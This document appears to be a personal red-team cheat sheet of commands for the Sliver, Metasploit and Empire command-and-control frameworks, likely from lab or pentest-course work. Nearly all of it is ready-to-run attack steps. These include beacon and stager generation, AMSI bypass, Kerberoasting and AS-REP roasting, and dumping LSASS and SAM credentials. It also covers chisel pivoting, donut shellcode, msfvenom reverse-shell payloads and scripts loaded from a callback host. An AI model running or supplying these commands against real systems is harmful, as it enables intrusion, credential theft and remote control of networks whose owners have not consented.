- [Sliver](#sliver)
  - [General](#general)
  - [Enum](#enum)
    - [Nomal](#nomal)
    - [Domain](#domain)
  - [Privilege Escalation](#privilege-escalation)
  - [Collection](#collection)
  - [Lateral Move](#lateral-move)
  - [Shellcode create](#shellcode-create)
    - [donut](#donut)
- [Metasploit](#metasploit)
- [Empire](#empire)

# Sliver
## General
```bash
/opt/sliver/sliver-server_linux

## Listener
http -L 10.0.0.1 -l 8088
jobs

## implant beacon
generate beacon --http 10.10.15.144:8088 -N mybe
### beacon tasks
tasks
### go session
use ??
interactive

## implant shellcode 
### session
profiles new --http 10.0.0.1:8088 --format shellcode mypf
## stage-listener
stage-listener --url tcp://10.0.0.1:443 --profile mypf 
## stager
generate stager -b '00 0a cc' --lhost 10.0.0.1 --lport 443 --save stage.bin 
-f python

### beacon
generate beacon --http 10.10.14.62:8088 -N mybe.bin -f shellcode
```

## Enum
### Nomal
```bash
# Nomal
getprivs
seatbelt -- -group=all
sharpup -- audit

wget https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1
sharpsh -- '-u http://10.10.14.36/PowerView.ps1,http://10.10.14.36/PrivescCheck.ps1 -c get-netlocalgroup,invoke-privesccheck'
```
### Domain
```bash
# Nomal
c2tc-domaininfo
sharpview -- Get-Domain
sharpview --in-process --amsi-bypass -- Get-Domain

#bloodhound
sharp-hound-4 -- -c All -d my.local --domainController 172.16.1.15 --zipfilename myhound

# ASREP
rubeus -- asreproast /format:hashcat /nowrap
# kerberoast
## enum
delegationbof 6 child.my.local
## attack
### BOF
#### https://github.com/outflanknl/C2-Tool-Collection/blob/e371a38c717edaf1650923575ab33bee0dd3e0ee/BOF/Kerberoast/TicketToHashcat.py
c2tc-kerberoast roast alice
### Rubeus
rubeus -- kerberoast /format:hashcat /nowrap
inline-execute-assembly /usr/share/windows-binaries/Ghostpack-CompiledBinaries/Rubeus.exe 'kerberoast /user:testuser /format:hashcat /nowrap'

# ADCS
certify -- find 
# Forest
execute -o powershell $Forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest(); $Forest.Domains
```

## Privilege Escalation
```bash
# GotPotato
execute-assembly /usr/share/windows-binaries/GodPotato-NET4.exe -cmd ''
## in current process
inline-execute-assembly

# PetitPotam
c2tc-petitpotam own target 
```

## Collection
```bash
# Nomal
##  NT AUTHORITY\SYSTEM
hashdump

# procdump
ps -e lsass
procdump --pid ??? /tmp/lsass.dmp
```

## Lateral Move
```bash
# chisel
https://github.com/jpillora/chisel/releases
# Reverse 
./chisel_1.9.0_linux_amd64 server -p 2345 --socks5 --reverse
## sliver
chisel client --max-retry-count 2 10.0.0.1:2345 R:socks
## Rscoks
tail /etc/proxychains4.conf
# forward
./chisel_1.9.0_linux_amd64 server -p 1234
## sliver
chisel client --max-retry-count 2 10.10.15.165:2345 8444:10.10.15.165:4444 8080:10.10.15.165:80

# pivot
## session
### Open 172.16.1.11:9898 for sliver
ifconfig
pivots tcp --bind 172.16.1.11

# name pipe
pivots named-pipe --bind Etaks
## implant
generate --named-pipe 172.16.1.11/pipe/academy -N pipe_Etaks 

# token
make-token -u svc_sql -d child.my.local -p Pass123
```

## Shellcode create
### donut
```bash
# nomal shell
donut -i /usr/share/windows-binaries/GodPotato-NET4.exe -a 2 -b 2 -p '-cmd c:\temp\mybe.exe' -o potato.bin

# sliver
execute-shellcode -p pid potato.bin
```

# Metasploit
```bash
# hundler
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT=1234 -f exe -o shell.exe
## to base64 
base64 -w0 shell.exe 
# start handler
use multi/handler
## htm c2
use exploit/windows/misc/hta_server
# sessions
sessions -l
sessions -i 1

# exploit suggest
use post/multi/recon/local_exploit_suggester

# privesc 
getsystem
migrate 

load kiwi
creds_all
lsa_dump_sam

# Port Forwading
use multi/manage/autoroute

use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set VERSION 5
run -j
jobs

# other
lcd /home/kali/Downloads
lpwd
download 
upload
```

# Empire
```bash
# first
listeners
uselistener http

usestager windows_launcher_vbs
usestager windows_cmd_exec

agents
interact
```